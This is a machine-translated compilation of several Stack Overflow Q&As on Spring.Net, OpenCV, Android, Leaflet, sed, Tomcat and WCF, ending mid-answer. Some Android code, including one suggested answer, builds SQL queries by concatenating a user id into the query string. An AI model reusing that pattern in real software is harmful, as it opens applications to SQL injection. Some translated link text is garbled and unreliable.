让我总结一下我们的架构：项目 A（不在我的控制之下）有一个 Sprint.Net 配置，它引用了一个设置（configurationProvider.url），如下所示：

```
<constructor-arg name="Url" value="${configurationProvider.url}" /> 
```

项目 B（我的项目，在我的控制下）有另一个配置文件，该文件具有此设置的值：

```
<configuration>
  <Environment>
    <add key="Dashboard.Environment"      value="UAT" />
    <add key="configurationProvider.url"  value="http://something/ConfigurationProvider.asmx"/>
    <add key="pkicheck.url"               value="http://something/webservices/pkicheck.asmx"/>
    <add key="sso.url"                    value="http://something/webservices/ssoclient.asmx"/>
  </Environment>
</configuration> 
```

当项目 B 是 .NET 3.5 时，这一切都运行良好。将此项目转换为 .NET 4（这是唯一的更改）时，整个事情开始失败，这给了我这个例外：

```
Could not resolve placeholder 'configurationProvider.url' 
```

显然没有在 ProjectB 配置文件中找到配置设置，尽管该文件存在并包含该值。3.5 和 4 之间会发生什么变化？

完全例外：

```
<ConfigurationErrorsException d1p1:type="ConfigurationErrorsException">
 <ClassName>System.Configuration.ConfigurationErrorsException</ClassName>
 <Message>Error creating context 'spring.root': Error registering object with name 'configurationProvider' defined in 'assembly [ProjectA.Core, Version=0.0.0.88, Culture=neutral, PublicKeyToken=1b28b51fb20f454e], resource [ProjectA.Core.Framework.config] line 111' : Could not resolve placeholder 'configurationProvider.url'.</Message>
 <Data d1p1:type="IDictionary"/>
<InnerException d1p1:type="Exception">
 <ClassName>Spring.Objects.Factory.ObjectDefinitionStoreException</ClassName>
 <Message>Error registering object with name 'configurationProvider' defined in 'assembly [ProjectA.Core, Version=0.0.0.88, Culture=neutral, PublicKeyToken=1b28b51fb20f454e], resource [ProjectA.Core.Framework.config] line 111' : Could not resolve placeholder 'configurationProvider.url'.</Message>
 <Data d1p1:type="IDictionary"/>
 <InnerException d1p1:type="Exception"/>
 <HelpURL/>
 <StackTraceString> at Spring.Objects.Factory.Config.PropertyPlaceholderConfigurer.ProcessProperties(IConfigurableListableObjectFactory factory, NameValueCollection props) at Spring.Objects.Factory.Config.PropertyResourceConfigurer.PostProcessObjectFactory(IConfigurableListableObjectFactory factory) at Spring.Context.Support.AbstractApplicationContext.ProcessObjectFactoryPostProcessors(IList objectFactoryPostProcessors) at Spring.Context.Support.AbstractApplicationContext.InvokeObjectFactoryPostProcessors() at Spring.Context.Support.AbstractApplicationContext.Refresh() at Spring.Context.Support.XmlApplicationContext..ctor(Boolean refresh, String name, Boolean caseSensitive, IApplicationContext parentContext, String[] configurationLocations) at Spring.Context.Support.XmlApplicationContext..ctor(String name, Boolean caseSensitive, String[] configurationLocations) at _dynamic_Spring.Context.Support.XmlApplicationContext..ctor(Object[] ) at Spring.Reflection.Dynamic.SafeConstructor.Invoke(Object[] arguments) at Spring.Context.Support.ContextHandler.RootContextInstantiator.InvokeContextConstructor(ConstructorInfo ctor) at Spring.Context.Support.ContextHandler.ContextInstantiator.InstantiateContext() at Spring.Context.Support.ContextHandler.InstantiateContext(IApplicationContext parentContext, Object configContext, String contextName, Type contextType, Boolean caseSensitive, String[] resources) at Spring.Context.Support.ContextHandler.Create(Object parent, Object configContext, XmlNode section)</StackTraceString>
 <RemoteStackTraceString/>
 <RemoteStackIndex>0</RemoteStackIndex>
 <ExceptionMethod>8 ProcessProperties Spring.Core, Version=1.3.0.20349, Culture=neutral, PublicKeyToken=65e474d141e25e07 Spring.Objects.Factory.Config.PropertyPlaceholderConfigurer Void ProcessProperties(Spring.Objects.Factory.Config.IConfigurableListableObjectFactory, System.Collections.Specialized.NameValueCollection)</ExceptionMethod>
 <HResult>-2146232832</HResult>
 <Source>Spring.Core</Source>
 <WatsonBuckets d1p1:type="System.Byte"d1p1:includeArrayAttribute="true"/>
 <_resourceDescription>assembly [ProjectA.Core, Version=0.0.0.88, Culture=neutral, PublicKeyToken=1b28b51fb20f454e], resource [ProjectA.Core.Framework.config] line 111</_resourceDescription>
 <_objectName>configurationProvider</_objectName>
 </InnerException>
 <HelpURL/>
 <StackTraceString> at System.Configuration.BaseConfigurationRecord.EvaluateOne(String[] keys, SectionInput input, Boolean isTrusted, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentResult) at System.Configuration.BaseConfigurationRecord.Evaluate(FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentResult, Boolean getLkg, Boolean getRuntimeObject, Object& result, Object& resultRuntimeObject) at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject) at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject) at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject) at System.Configuration.BaseConfigurationRecord.GetSection(String configKey) at System.Configuration.ClientConfigurationSystem.System.Configuration.Internal.IInternalConfigSystem.GetSection(String sectionName) at System.Configuration.ConfigurationManager.GetSection(String sectionName) at Spring.Util.ConfigurationUtils.GetSection(String sectionName) at Spring.Context.Support.ContextRegistry.InitializeContextIfNeeded() at Spring.Context.Support.ContextRegistry.GetContext() at ProjectA.Core.Controller.Initialise(String flavour) in d:\TeamCity8100\buildAgent\work\850180d7b576030f\Code\Src\ProjectA\Framework\Core\Controller.cs:line 238</StackTraceString>
 <RemoteStackTraceString/>
 <RemoteStackIndex>0</RemoteStackIndex>
 <ExceptionMethod>8 EvaluateOne System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a System.Configuration.BaseConfigurationRecord System.Object EvaluateOne(System.String[], System.Configuration.SectionInput, Boolean, System.Configuration.FactoryRecord, System.Configuration.SectionRecord, System.Object)</ExceptionMethod>
 <HResult>-2146232062</HResult>
 <Source>System.Configuration</Source>
 <WatsonBuckets d1p1:type="System.Byte"d1p1:includeArrayAttribute="true"/>
 <filename d1p1:type="Object"/>
 <line>0</line>
 <firstFilename d1p1:type="Object"/>
 <firstLine>0</firstLine>
 <count>0</count>
 </ConfigurationErrorsException> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-11T17:04:08.117

我最终发现了问题。我们在配置中使用 PropertyPlaceholderConfigurer，我们从未设置“Order”属性。所以 Spring 在 Order 上“排序”，但由于 Order 总是等于 int.Max，所以订单输出是不确定的。

将 Order 添加到配置文件中修复了它。

# opencv - “颜色量化”是 OpenCV 中颜色量化的正确名称吗？

> ID：15244794
> 
> 赞同：0
> 
> 时间：2013-03-06T10:28:57.940
> 
> 标签：opencv, colors, quantization

我正在寻找一种方法来使用 OpenCV 获取给定图像中每个像素的所有 RGB 值的完整列表，现在我称之为“颜色量化”。

问题是，根据我在网上找到的，至少在这一点上，这个“颜色量化”的东西是关于直方​​图或“颜色减少”或类似的*离散计算*解决方案。

由于我知道我想要什么，而且“互联网”似乎对这个词的含义有不同的看法，我想知道：也许没有真正的解决方案？OpenCV 库中的可行方式或工作算法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:37:47.720

颜色量化是在有限的数字颜色空间中转换无限的自然颜色。无论如何，要创建全彩色“直方图”，您可以使用 opencv 的稀疏矩阵实现并编写自己的函数来计算它。当然，如果您没有关于图像的其他结构或连续性信息，您必须逐个访问像素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T11:53:08.923

一般来说，**量化**是将具有实数（数学）值的输入信号转换为一组离散值的操作。实现此过程的一种可能算法是计算数据的直方图，然后保留与具有较高总体的直方图的*n 个*bin对应的*n 个值。*

 *您尝试做的可能会被称为**颜色列表**。如果您正在使用 8 位量化图像（类型`CV_8UC3`），我的猜测是您通过获取输入图像的直方图（bin 宽度等于 1）然后搜索非空 bin 的结果来做您想做的事情。*

# android - 选项菜单未在 Android 中显示

> ID：15244797
> 
> 赞同：1
> 
> 时间：2013-03-06T10:29:16.953
> 
> 标签：android, android-optionsmenu

我的目标是让您使用一个菜单进行所有活动。为此，我有一个由 2 个方法组成的基本活动：`onCreateOptionsMenu()`和`onOptionsItemSelected()`. 在`onCreateOptionsMenu()`中，我正在使用`MenuInflater`.

此外，我有 2 个活动扩展了上述活动，`BaseActivity`因此这两个活动都显示了相同的菜单。我的问题是，当我的第一个活动启动时，会显示选项菜单，我从第一个活动转到第二个活动。在第二个活动中，当我按下菜单按钮时，我可以查看菜单。之后，使用`Back`按键，我再次来到第一个活动，菜单也显示在那里，但是当我之后移动到第二个活动时，**菜单没有显示给我。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:44:36.397

您能否发布您的基本活动的 onOptionsItemSelected 和 onCreateOptionsMenu 的代码？

无论如何，没有可用的代码。而且不够清楚，我认为以下内容对您有用...

添加`@Override public void onBackPressed() { finish(); }`

到您的基本活动

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-12T17:02:40.300

最低 SDK 版本可能是原因。如果你把它减少到 13-，你应该会看到菜单再次出现。关于这个主题的好文章：[POST](http://android-developers.blogspot.com/2012/01/say-goodbye-to-menu-button.html "安卓菜单")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-07T06:07:58.617

我认为您在 MainActivity 中添加了以下代码。

```
public boolean onCreateOptionsMenu(Menu menu) {
    super.onCreateOptionsMenu(menu);
    MenuInflater inflater = getMenuInflater();
    inflater.inflate(R.menu.menu, menu);
    return true;
} 
```

这对我来说很好。

# leaflet - 在传单中找到选定标记/圆圈标记/点的关联折线

> ID：15244798
> 
> 赞同：0
> 
> 时间：2013-03-06T10:29:20.280
> 
> 标签：leaflet

我在地图上有多个圆圈标记。

我想找出有多少多段线穿过该标记并想要删除该多段线如果多段线不存在，那么我想添加多段线。

我正在使用传单。

```
 <script type="text/javascript">

      function init(){
    var map = L.map('map').setView([51.49521, -0.10062], 13);
    L.tileLayer('http://{s}.tile.cloudmade.com/BC9A493B41014CAABB98F0471D759707/997/256/{z}/{x}/{y}.png', {
        maxZoom: 18,
        attribution: 'Map data &copy; <a href="http://openstreetmap.org">OpenStreetMap</a> contributors, <a href="http://creativecommons.org/licenses/by-sa/2.0/">CC-BY-SA</a>, Imagery © <a href="http://cloudmade.com">CloudMade</a>'
    }).addTo(map);

    // get all 6 points
    var points = [
        [51.49346, -0.11518],
        [51.49827, -0.06763],
        [51.48331, -0.08154],
        [51.52284, -0.09974],
        [51.51932, -0.06695],
        [51.50949, -0.1363]
    ];

    // polyline
    var selection = [];
    var polyline = new L.Polyline([], {
        color: 'blue',
        weight: 5,
        smoothFactor: 1
    }).addTo(map);

    var changeMarkerState = function (marker, select) {
        if (marker instanceof L.CircleMarker) {
            if (select) {
                marker.setRadius(25);
            } else {
                marker.setRadius(10);
            }
        }
        if (marker instanceof L.Marker) {
            if (select) {
                marker.options.title = 'selected';
            } else {
                marker.options.title = 'unselected';
            }
            marker.setIcon(new L.Icon.Default());
        }
    };

    var onClick = function () {
        var index = selection.indexOf(this);
        if (index !== -1) {
            changeMarkerState(this, false);
            selection.splice(index, 1);
            polyline.spliceLatLngs(index, 1);
        } else {
            changeMarkerState(this, true);
            selection.push(this);
            polyline.addLatLng(this.getLatLng())
        }
    };

    // centerpoint
    var centerPoint = new L.LatLng(51.49521, -0.10062);
    var marker1 = L.marker([51.49521, -0.10062],
            {title: 'unselected'}).on('click', onClick).addTo(map);

    // adding allo points to map
    for (var i = 0, l = points.length; i < l; i++)
    {
        // here I can use marker also(if solution is possible with markers)
        L.circleMarker(points[i]).on('click', onClick).addTo(map);
        var myPoint = new L.LatLng(points[i][0],points[i][1]);
        var myPointList = [myPoint, centerPoint];

    var firstpolyline = new L.Polyline(myPointList, {
    color: 'red',
    weight: 5,
    smoothFactor: 1

    }).addTo(map);
    }

    }
      </script> 
```

在上面的代码中，我正在做的是从不同的圆圈标记到一个中心点绘制多条红色折线。

在选择两个圆形标记时，我在它们之间绘制蓝色折线。

同时我想删除圆圈标记和中心点之间的红色折线。

此外，如果未选择圆形标记，则应添加该圆形标记和中心点之间的红色折线。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T08:34:55.317

要比较两个 latlng，请使用`L.LatLng.equals`：[https](https://github.com/Leaflet/Leaflet/blob/master/src/geo/LatLng.js#L24) ://github.com/Leaflet/Leaflet/blob/master/src/geo/LatLng.js#L24 。

要从折线中获取纬度，请使用`L.Polyline.getLatLngs`：[https](https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L34) ://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L34 。

现在您可以在折线中找到您的观点并使用以下方法将其删除：https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L48 或添加使用：[https](https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L48) : `L.Polyline.spliceLatLngs`// [github。 com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L43](https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L43)或使用设置：[https ://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js](https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L38) [#L38](https://github.com/Leaflet/Leaflet/blob/master/src/layer/vector/Polyline.js#L38)。`L.Polyline.addLatLng``L.Polyline.setLatLngs`

# bash - 如何使用 sed 从 bash 中的字符串中删除转义字符？

> ID：15244801
> 
> 赞同：1
> 
> 时间：2013-03-06T10:29:27.210
> 
> 标签：bash, unix, sed, escaping, character

我需要从 bash 中的字符串中删除转义字符。我得到一个数据结构，其中包含带有 / 转义的 url 路径，因此我收到了常规链接：

```
http://stackoverflow.com/questions/ask 
```

作为一个转义/：

```
http:\/\/stackoverflow.com\/questions\/ask 
```

现在我需要从第二个链接中删除 \。为此，我尝试使用 sed

```
 `echo '"'${paths[$index]}'"' | sed "s@\\@@g"` 
```

但我收到一个错误：

```
sed: -e expression #1, char 6: unterminated `s' command 
```

如果我将 \\ 替换为 ie。_ 它就像一个魅力，并删除字符串中所有出现的 _。如何使用 sed 去除字符串中的转义字符？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-06T10:32:24.853

试试这个：

```
.......|sed 's@\\@@g' 
```

或者：

```
.......|sed "s@\\\\@@g" 
```

**编辑**添加测试输出：

```
kent$  echo "http:\/\/stackoverflow.com\/questions\/ask"|sed "s@\\\\@@g"
http://stackoverflow.com/questions/ask

kent$  echo "http:\/\/stackoverflow.com\/questions\/ask"|sed 's@\\@@g'  
http://stackoverflow.com/questions/ask 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:35:19.397

您的问题不清楚您想要哪种方式，所以这是两种方式：

```
$ sed 's@/@\\/@g' <<< "http://stackoverflow.com/questions/ask"
http:\/\/stackoverflow.com\/questions\/ask

$ sed 's@\\/@/@g' <<< "http:\/\/stackoverflow.com\/questions\/ask"
http://stackoverflow.com/questions/ask 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T13:54:03.963

你不需要使用`sed`.

```
paths[index]=${paths[index]//\\/} 
```

或者干脆

```
echo ${paths[index]//\\/} 
```

在不就地修改值的情况下查看结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-05T11:46:02.180

你可以使用这个：

```
sed 's@\\@@g' 
```

但问题是当你在字符串中遇到你真正想要的反斜杠时，它被转义了。在这种情况下 ：

```
sed 's/\\\\/\x1/' |sed 's/[\]//g' | sed 's/\x1/\\/g' 
```

用临时字符 [SOH] 替换双反斜杠，替换所有其他反斜杠，然后恢复所需的反斜杠。

# java - 启动时设置tomcat初始连接池

> ID：15244807
> 
> 赞同：0
> 
> 时间：2013-03-06T10:29:43.323
> 
> 标签：java, tomcat, connection

我正在寻找有关如何在 tomcat 启动时启用连接池的信息。我的设置权使tomcat在第一次请求时初始化并向池添加X个连接，但我希望tomcat在启动tomcat时执行此操作。

我在 Server.xml 中的设置如下：

```
<Context docBase=".../apache-tomcat-5.5.27/webapps/app" path="/app" reloadable="true" 
source="org.eclipse.jst.j2ee.server:app">
<Resource auth="Container" driverClassName="com.mysql.jdbc.Driver" maxActive="100" 
maxIdle="30" initialSize="10" 
maxWait="10000" name="jdbc/app" password="pass" type="javax.sql.DataSource" 
url="jdbc:mysql://ip:3306/dbschema" username="username"/> 
```

正如我之前提到的，将 initialSize 设置为 10 会在创建第一个连接时创建 10 个连接，但我希望在启动 tomcat 时使用此功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T14:24:15.147

解决了这个问题，我会回答我自己的问题，以防其他人需要它。

通过创建一个 servlet、覆盖 init() 方法并通过在 tomcat 中修改 web.xml 在启动时加载该 servlet 来解决这个问题。只要`initialSize`已经在 servlet.xml 中设置，它就可以工作。

所以，实际发生的是，tomcat 在启动时加载了这个 servlet，而这个 servlet 所做的只是创建一个数据库连接。当这个连接被创建时，tomcat会启动initialSize中指定的连接数

# android - 从表中获取多个值

> ID：15244814
> 
> 赞同：0
> 
> 时间：2013-03-06T10:30:04.020
> 
> 标签：android

```
public List<String> getDays(long iid)
{
  List<String> days= new ArrayList<String>();
  cursor = database.query(MySqliteHelper.TABLE_REPEAT, daysColumn, MySqliteHelper.COLUMN_TID + "=" + iid, null, null, null, null);
  while(fg>=1)
  {
      cursor = database.query(MySqliteHelper.TABLE_REPEAT, daysColumn, MySqliteHelper.COLUMN_TID + "=" + iid, null, null, null, null);
          String day = cursor.getString(cursor.getColumnIndex(MySqliteHelper.COLUMN_DAYS));
        days.add(day);
      cursor.moveToNext();
          if(cursor.isAfterLast())
          {
       fg=0;
          }
  }
  cursor.close();
  fg=1;
  return days;
  } 
```

现在我得到了`arrayindexoutofbound`例外！我是 android 和编程新手.. 建议我应该使用什么技术。

我的日志猫显示： 03-06 11:20:12.941: E/AndroidRuntime(2025): FATAL EXCEPTION: main 03-06 11:20:12.941: E/AndroidRuntime(2025): java.lang.RuntimeException: Unable to开始活动 ComponentInfo{com.example.habitator/com.example.habitator.AlarmDays}: android.database.CursorIndexOutOfBoundsException: 请求索引 -1，大小为 1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:20:30.933

为什么又要查询数据库？如果 cursor.isAfterLast() 满足，则使用 break。因为这个，你得到错误 arrayindexoutofbound 和

还指定 cursor.moveToFirst(); 将光标移动到第一个位置

试试这个：

```
public List<String> getDays(long iid)
{
  List<String> days= new ArrayList<String>();
  cursor = database.query(MySqliteHelper.TABLE_REPEAT, daysColumn, MySqliteHelper.COLUMN_TID + "=" + iid, null, null, null, null);
  cursor.moveToFirst();
  while(fg>=1)
  {
         if(cursor.isAfterLast())
          {
              fg=0;
              break; //brek the loop 
          }
      String day = cursor.getString(cursor.getColumnIndex(MySqliteHelper.COLUMN_DAYS));
        days.add(day);
      cursor.moveToNext();  
  }
  cursor.close();
  fg=1;
  return days;
  } 
```

希望这对你有用！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:44:55.383

```
 Cursor c=db.rawQuery("select * from table_name where user_fk='" + get_userid + "'",null);
     List<String[]> list = new ArrayList<String[]>();

         c.moveToFirst();
         while(!c.isAfterLast())
         {
             title=new String[]{c.getString(3),c.getString(0)};
             list.add(title);
             c.moveToNext(); 
         }      

     c.close();
     db.close(); 
```

1.使用数组从表中获取多个值。

2.之后将该数组值存储在列表中。

# ios - 是否有任何 obj-c 库可以帮助我们编写一个可以模拟不同网络服务的 App，例如“Network Link Conditioner”？

> ID：15244820
> 
> 赞同：0
> 
> 时间：2013-03-06T10:30:26.730
> 
> 标签：ios, objective-c, uiwebview

我目前正在构建一个 iOS 应用程序，使用 UIWebview 加载任何页面。现在我想在查看页面时模拟不同的网络服务。我知道 iOS6 为 iOS 开发人员提供了“开发人员”设置和“网络链接调节器”选项并执行此操作。但我希望任何使用我的应用程序的人也可以这样做，而且他不需要成为 iOS 开发人员。苹果有这样的 API 供我们使用“网络链接调节器”吗？如果没有，是否有任何 obj-c 库可供我们这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:44:40.343

您可以采用 Google 对 iOS Chrome 所做的方法，他们在网络和 UIWebView 之间插入了自己的层。

挑战在于以一种使 MIH 的行为尽可能接近其他 iOS 应用程序的方式来实现。

**编辑**

在对 Akamai 的 WebPageTest 的 Mobitest 代理进行一些更改时遇到了这个[http://allseeing-i.com/ASIHTTPRequest/How-to-use#bandwidth_throttling](http://allseeing-i.com/ASIHTTPRequest/How-to-use#bandwidth_throttling)

ASIHTTP 库看起来已经被废弃了，但它可能是一个开始的地方

# asp.net - 如何将包含列表的 xml 发送到 wcf 服务？

> ID：15244821
> 
> 赞同：0
> 
> 时间：2013-03-06T10:30:37.203
> 
> 标签：asp.net, wcf

我正在实现一个 wcf restful 服务，我想将一个包含类列表的 xml 发送到 wcf 服务。其他参数成功传递给服务，但列表为空。我的xml；

```
 <phoneBookWebServiceSearchResponse xmlns="http://callturksvc.alfion.com.tr">
    <uniqueId>40</uniqueId>
    <webServiceResponseType>SUCCESS</webServiceResponseType>
    <clientQueryNo>0</clientQueryNo>
    <responseMessage>SUCCESS</responseMessage>
    <phoneBookList>
    <phoneBook>
        <cityCode>34</cityCode>
        <cityName>İstanbul</cityName>
        <districtName>Beşiktaş</districtName>
        <firstName>Şuayp</firstName>
        <lastModifiedDateTime>2013-01-28T15:30:36.925+02:00</lastModifiedDateTime>
        <lastName>Çiçek</lastName>
        <phoneBookTypeEnumValue>TURKCELL</phoneBookTypeEnumValue>
        <phoneNumberText>5356875946</phoneNumberText>
    </phoneBook>
    </phoneBookList>
    </phoneBookWebServiceSearchResponse> 
```

以及将处理此 xml 的类；

```
[DataContract(Name = "phoneBookWebServiceSearchResponse", Namespace ="http://callturksvc.alfion.com.tr")]
public class phoneBookWebServiceSearchResponse
{
    [DataMember(Order = 1, Name = "uniqueId")]
    public string uniqueId { get; set; }
    [DataMember(Order = 2, Name = "webServiceResponseType")]
    public string webServiceResponseType { get; set; }
    [DataMember(Order = 3, Name = "clientQueryNo")]
    public string clientQueryNo { get; set; }
    [DataMember(Order = 4, Name = "responseMessage")]
    public string responseMessage { get; set; }
    [DataMember(Order = 5, Name = "phoneBookList")]
    public phoneBookList phoneBookList { get; set; }

    public phoneBookWebServiceSearchResponse()
    {
        uniqueId = string.Empty;
        webServiceResponseType = string.Empty;
        clientQueryNo = string.Empty;
        responseMessage = string.Empty;
        phoneBookList = new phoneBookList();
    }
}

public class phoneBookList
{
    [DataMember(Order = 1, Name = "phoneBook")]
    public List<phoneBook> phoneBook { get; set; }
    public phoneBookList()
    {
        phoneBook = new List<phoneBook>();
    }
}

public class phoneBook
{
    [DataMember(Order = 1, Name = "firstName")]
    public string firstName { get; set; }
    [DataMember(Order = 2, Name = "lastName")]
    public string lastName { get; set; }
    [DataMember(Order = 3, Name = "cityCode")]
    public string cityCode { get; set; }
    [DataMember(Order = 4, Name = "cityName")]
    public string cityName { get; set; }
    [DataMember(Order = 5, Name = "districtName")]
    public string districtName { get; set; }
    [DataMember(Order = 6, Name = "lastModifiedDateTime")]
    public string lastModifiedDateTime { get; set; }
    [DataMember(Order = 7, Name = "phoneBookTypeEnumValue")]
    public string phoneBookTypeEnumValue { get; set; }
    [DataMember(Order = 8, Name = "phoneNumberText")]
    public string phoneNumberText { get; set; }
    public phoneBook()
    {
        firstName = string.Empty;
        lastName = string.Empty;
        cityCode = string.Empty;
        cityName = string.Empty;
        districtName = string.Empty;
        lastModifiedDateTime = string.Empty;
        phoneBookTypeEnumValue = string.Empty;
        phoneNumberText = string.Empty;
    }
} 
```

响应类是；

```
 [DataContract(Name="CallTurkResponse", Namespace ="http://callturksvc.alfion.com.tr")]
    public class CallTurkResponse
    {
      [DataMember(Name="responseMessage", Order=1)]
      public string responseMessage { get; set; }
     } 
```

我的服务等级是；

```
 [OperationContract]
    [WebInvoke(Method = "POST",
        ResponseFormat = WebMessageFormat.Xml,
        RequestFormat = WebMessageFormat.Xml,
        BodyStyle = WebMessageBodyStyle.Bare,
        UriTemplate = "auth")]
    CallTurkResponse Auth(phoneBookWebServiceSearchResponse res); 
```

最后我的服务是；

```
 public CallTurkResponse Auth(phoneBookWebServiceSearchResponse res)
    {
        return new CallTurkResponse
        {
            responseMessage = "SUCCESS"
        };
    } 
```

问题是当我在上面发送 xml 请求时，我在调试器中成功获得了 uniqueId、webServiceResponseType、clientQueryNo 和 responseMessage。但是 phoneBookList 提供服务是空的。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:51:53.750

使用`IEnumerable`而不是 List `List<phoneBook>`。

* * *

编辑：

考虑使用`IEnumerable`like 一个选项。但是你也需要对你的代码进行一些更新。`DataContract`首先，您应该使用Attribute标记所有类，提供与您标记的`phoneBookWebServiceSearchResponse`类相同的命名空间。其他方式会导致 xml 中的命名冲突。而且看起来你根本不需要上课`phoneBookList`。

```
[DataContract(Name = "phoneBookWebServiceSearchResponse", Namespace = "http://callturksvc.alfion.com.tr")]
    public class phoneBookWebServiceSearchResponse
    {
        [DataMember(Order = 1, Name = "uniqueId")]
        public string uniqueId { get; set; }
        [DataMember(Order = 2, Name = "webServiceResponseType")]
        public string webServiceResponseType { get; set; }
        [DataMember(Order = 3, Name = "clientQueryNo")]
        public string clientQueryNo { get; set; }
        [DataMember(Order = 4, Name = "responseMessage")]
        public string responseMessage { get; set; }
        [DataMember(Order = 5, Name = "phoneBookList")]
        public List<phoneBook> phoneBookList { get; set; }
    } 
```

```
 [DataContract(Name = "phoneBook", Namespace = "http://callturksvc.alfion.com.tr")]
    public class phoneBook
    {
        [DataMember(Order = 1, Name = "firstName")]
        public string firstName { get; set; }
        [DataMember(Order = 2, Name = "lastName")]
        public string lastName { get; set; }
        [DataMember(Order = 3, Name = "cityCode")]
        public string cityCode { get; set; }
        [DataMember(Order = 4, Name = "cityName")]
        public string cityName { get; set; }
        [DataMember(Order = 5, Name = "districtName")]
        public string districtName { get; set; }
        [DataMember(Order = 6, Name = "lastModifiedDateTime")]
        public string lastModifiedDateTime { get; set; }
        [DataMember(Order = 7, Name = "phoneBookTypeEnumValue")]
        public string phoneBookTypeEnumValue { get; set; }
        [DataMember(Order = 8, Name = "phoneNumberText")]
        public string phoneNumberText { get; set; }
    } 
```

# android - 当我尝试获得此设计时，按钮消失了

> ID：15244825
> 
> 赞同：-2
> 
> 时间：2013-03-06T10:30:50.073
> 
> 标签：android

我想用 TableLayout 做一个计算器。我知道它更适合 GridLayout 但 TableLayout 是必须的。

我试图得到这个设计：

![在此处输入图像描述](../Images/a2f221f1f4e3eb0525864df7d7ba2bf6.png)

如您所见，数字（1 到 9）的大小和顺序相同，带有连接和断开按钮。然而，在我目前的设计中，它是这样的：

但我设计中的按钮看起来像：

![在此处输入图像描述](../Images/9c8a22cf1438f58653730dec5c9125ae.png)

这是我的代码：

```
LinearLayout layout = new LinearLayout(this);
layout.setOrientation(LinearLayout.VERTICAL);
layout.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.MATCH_PARENT));

TextView titleView = new TextView(this);
titleView.setText("Table Layout");
titleView.setLayoutParams(new LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT));
layout.addView(titleView);

LinearLayout layout2 = new LinearLayout(this);
layout2.setOrientation(LinearLayout.HORIZONTAL);
layout2.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.WRAP_CONTENT));

Button btnConnect = new Button(this);
btnConnect.setText("Connect");
btnConnect.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1));
layout2.addView(btnConnect);

TextView titleViewSpace = new TextView(this);
titleViewSpace.setLayoutParams(new  LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1));
layout2.addView(titleViewSpace);

Button btnDisconnect = new Button(this);
btnDisconnect.setText("Disconnect");
btnDisconnect.setLayoutParams(new  LinearLayout.LayoutParams(0,  LinearLayout.LayoutParams.WRAP_CONTENT, 1));
layout2.addView(btnDisconnect);

layout.addView(layout2);

TableLayout tblLayout = new TableLayout(this);
tblLayout.setLayoutParams(new TableLayout.LayoutParams(TableLayout.LayoutParams.MATCH_PARENT,TableLayout.LayoutParams.MATCH_PARENT));
TableRow tblrow = null;

for (int i = 1; i <= 9; i++) {
    if (i % 3 == 1) {
        tblrow = new TableRow(this);
        tblLayout.addView(tblrow);

    }
    Button b = new Button(this);
    b.setText("" + i);
    tblrow.addView(b);
}

TableRow tr = new TableRow(this);
Button btnZero = new Button(this);
btnZero.setText("0");
Button btnHash = new Button(this);
btnHash.setText("#");
Button btnStar = new Button(this);
btnStar.setText("*");

tr.addView(btnZero);
tr.addView(btnHash);
tr.addView(btnStar);

tblLayout.addView(tr);
layout.addView(tblLayout);

setContentView(layout); 
```

为了使我的按钮与连接和断开按钮的顺序和大小相同

我只是在循环中创建按钮时这样做

```
for (int i = 1; i <= 9; i++) {
        if (i % 3 == 1) {
            tblrow = new TableRow(this);
            tblLayout.addView(tblrow);

        }
        Button b = new Button(this);
        b.setText("" + i);
        b.setLayoutParams(new LayoutParams(0,LayoutParams.WRAP_CONTENT,1));
        tblrow.addView(b);
    } 
```

但是当我把这个LayoutParams：

```
b.setLayoutParams(new LayoutParams(0,LayoutParams.WRAP_CONTENT,1)); 
```

按钮（1 到 9）在屏幕上消失。为什么？我该如何克服这个问题？我怎样才能在同一个屏幕上制作这样的按钮？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:51:18.017

这就是我所需要的：

```
